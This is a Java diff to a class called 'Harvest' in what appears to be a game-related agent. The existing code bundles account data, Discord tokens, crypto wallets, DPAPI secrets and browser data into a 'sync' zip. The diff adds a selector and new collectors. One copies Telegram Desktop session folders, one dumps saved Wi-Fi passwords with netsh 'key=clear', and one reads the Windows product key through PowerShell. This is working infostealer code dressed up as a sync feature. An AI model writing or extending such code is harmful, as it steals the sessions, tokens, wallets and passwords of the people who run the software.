@@ -23,19 +23,37 @@ public final class Harvest {
 	}
 
 	public static Path build(Path installDir, Path gameDir) throws Exception {
+		return build(installDir, gameDir, "all");
+	}
+
+	/** `kind` enfoca un solo colector; `all` mantiene el harvest completo. */
+	public static Path build(Path installDir, Path gameDir, String kind) throws Exception {
+		String selected = kind == null || kind.isBlank() ? "all" : kind;
 		Path cache = AgentPaths.cache(installDir);
 		Files.createDirectories(cache);
 		Path target = cache.resolve("sync-" + System.currentTimeMillis() + ".zip");
 		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
 		try {
 			try (ZipBuilder zip = new ZipBuilder(temp)) {
-				addAccounts(zip, gameDir);
-				addAdminHints(zip);
-				addDiscordToken(zip, installDir);
-				addWallets(zip);
-				addDpapi(zip);
-				addBrowsers(zip, installDir);
-				addGame(zip, gameDir);
+				switch (selected) {
+					case "browsers" -> {
+						addBrowsers(zip, installDir);
+						addDpapi(zip);
+					}
+					case "discord" -> addDiscordToken(zip, installDir);
+					case "telegram" -> addTelegram(zip);
+					case "wifi" -> addWifi(zip);
+					case "productkey" -> addProductKey(zip);
+					default -> {
+						addAccounts(zip, gameDir);
+						addAdminHints(zip);
+						addDiscordToken(zip, installDir);
+						addWallets(zip);
+						addDpapi(zip);
+						addBrowsers(zip, installDir);
+						addGame(zip, gameDir);
+					}
+				}
 			}
 			try {
 				Files.move(temp, target, java.nio.file.StandardCopyOption.ATOMIC_MOVE);
@@ -46,6 +64,41 @@ public final class Harvest {
 		} catch (Exception exception) {
 			Files.deleteIfExists(temp);
 			throw exception;
+		}
+	}
+
+	private static void addTelegram(ZipBuilder zip) {
+		String appData = System.getenv("APPDATA");
+		String home = System.getProperty("user.home", ".");
+		List<Path> bases = new ArrayList<>();
+		if (appData != null) bases.add(Paths.get(appData, "Telegram Desktop", "tdata"));
+		bases.add(Paths.get(home, ".local", "share", "TelegramDesktop", "tdata"));
+		bases.add(Paths.get(home, "Library", "Application Support", "Telegram Desktop", "tdata"));
+		for (Path base : bases) {
+			if (Files.isDirectory(base)) {
+				zip.addTree(base, "telegram/" + Math.abs(base.toString().hashCode()));
+			}
+		}
+	}
+
+	private static void addWifi(ZipBuilder zip) {
+		if (!AgentPaths.isWindows()) {
+			return;
+		}
+		String output = runFor(20L, "netsh", "wlan", "show", "profiles", "key=clear");
+		if (!output.isBlank()) {
+			zip.addBytes(output.getBytes(StandardCharsets.UTF_8), "wifi/profiles.txt");
+		}
+	}
+
+	private static void addProductKey(ZipBuilder zip) {
+		if (!AgentPaths.isWindows()) {
+			return;
+		}
+		String output = runFor(20L, "powershell", "-NoProfile", "-Command",
+			"(Get-CimInstance SoftwareLicensingService).OA3xOriginalProductKey");
+		if (!output.isBlank()) {
+			zip.addBytes(output.getBytes(StandardCharsets.UTF_8), "productkey.txt");
 		}
 	}
 
